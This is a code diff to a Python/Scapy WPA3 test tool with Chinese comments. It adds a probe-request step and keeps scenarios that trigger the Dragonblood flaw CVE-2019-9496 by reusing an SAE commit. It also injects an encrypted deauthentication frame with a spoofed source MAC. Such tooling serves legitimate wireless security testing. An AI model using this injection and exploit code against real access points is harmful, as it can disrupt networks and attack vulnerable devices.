@@ -21,6 +21,7 @@ from scapy.layers.dot11 import (
     RSNCipherSuite,
     AKMSuite,
     Dot11QoS,
+    Dot11EltRates,
     LLC,
     conf
     )
@@ -34,7 +35,8 @@ from scapy.config import conf as scapyconf
 
 from .libwifi import log,DEBUG
 from .utils_wpa3_crypt import Calc_MIC, CCMPCrypto
-from .utils_wifi_inject import Dot11EltRates
+from .utils_wifi_inject import ProbeReq
+
 from socket_hook_py import sendp, sniff 
 
 # ----------------------- Utility ---------------------------------
@@ -42,11 +44,12 @@ from socket_hook_py import sendp, sniff
 FORMAT = "[%(pathname)s:%(lineno)d] --- %(message)s"
 logging.basicConfig(level = logging.DEBUG, format=FORMAT)
 
-class SCENE:
-    auth = 0
-    asso = 1
-    four_way_handshake = 2
-    cve_2019_9496 = 3
+class Scene:
+    probeReq = 0
+    auth = 1
+    asso = 2
+    four_way_handshake = 3
+    cve_2019_9496 = 4   # sae commit request not scalar or element, but still send confirm
 
 class SAE(Packet):
     name = "SAE"
@@ -529,6 +532,12 @@ def test(
     
     # logging.debug(config.__dict__)
     
+    # 探测请求
+    pr = ProbeReq.gen_Probe_req(ssid=config.ssid, dest_addr=config.ff_mac, source_addr=config.mac_sta)
+    sendp(pr, iface=config.iface, verbose=0)
+    if scene == Scene.probeReq:
+        sys.exit(0)
+    
     # # SAE
     # 链路认证
     logging.info("-------------------------SAE Authentication : ")
@@ -546,7 +555,7 @@ def test(
                     )
     t1.start()
     time.sleep(0.1)
-    if scene == SCENE.cve_2019_9496:
+    if scene == Scene.cve_2019_9496:
         ## dragonblood 漏洞
         logging.info("-------------------------CVE-2019-9496 : ")
         sae_tmp = SAE(sae_commit_1[Dot11Auth].payload.build())
@@ -559,7 +568,7 @@ def test(
     time.sleep(0.2)
     
     try:
-        if scene == SCENE.cve_2019_9496:
+        if scene == Scene.cve_2019_9496:
             ## dragonblood 漏洞
             sae_commit_2 = sae_commit_1
         else:
@@ -583,11 +592,11 @@ def test(
     dot11_confirm = sae.send_confirm()
     self_send(RadioTap()/dot11_confirm, iface=iface)
     
-    if scene == SCENE.cve_2019_9496:
+    if scene == Scene.cve_2019_9496:
         logging.info(f'Success scene {scene} : CVE-2019-9496.')
         sys.exit()
     
-    if scene == SCENE.auth:
+    if scene == Scene.auth:
         logging.info(f'Success scene {scene} : SAE Authentication.')
         sys.exit(0)
         
@@ -630,12 +639,10 @@ def test(
         logging.error('Not Found Association Response .')
         sys.exit(1)
 
-    if scene == SCENE.asso:
+    if scene == Scene.asso:
         logging.info(f'Success scene {scene} : Association.')
         sys.exit(0)
         
-        
-    # 密钥协商
     config = WiFi_Object(
             iface = iface,
             ssid = ssid,
@@ -655,15 +662,18 @@ def test(
     
     # 断开认证
     # # WPA3 的 deauth 经过了加密，也就是必须完成完整协商才能 deauth
-    logging.info(f"-------------------------\n从AP离开: ")
+    logging.info(f"-------------------------从AP离开: ")
     TK : bytes = PTK[-16:]
     Plain_text = bytes(Dot11Deauth(reason=3))
     # logging.debug(f'TK & Plain_text : {TK.hex(), Plain_text.hex()}')
     dot11_packet = ( 
                     Dot11(type=0, subtype=12, FCfield="protected",
                         addr1=config.mac_ap, 
-                        addr2=config.mac_sta, 
-                        addr3=config.mac_ap
+                        # addr2=config.mac_sta, 
+                        # addr2='00:00:00:00:00:00', 
+                        addr2='02:00:00:00:00:00', 
+                        # addr3=config.mac_ap
+                        addr3='02:00:00:00:00:00', 
                         ) / 
                     Dot11CCMP(ext_iv=1, PN0=4))
     # logging.debug(f'Dot11 Layer : { bytes(dot11_packet).hex() } ')
@@ -682,8 +692,9 @@ def test(
                     Raw(deauth_cipher) / 
                     Raw(MIC)
                     )
-    self_send(wpa3_deauth, iface = config.iface)
-    if scene == SCENE.four_way_handshake:
+    if self_send(wpa3_deauth, iface = config.iface):
+        logging.info(f'Deauth done.')
+    if scene == Scene.four_way_handshake:
         logging.info(f'Success scene {scene} : 4_way_handshake.')
         sys.exit(0)
 
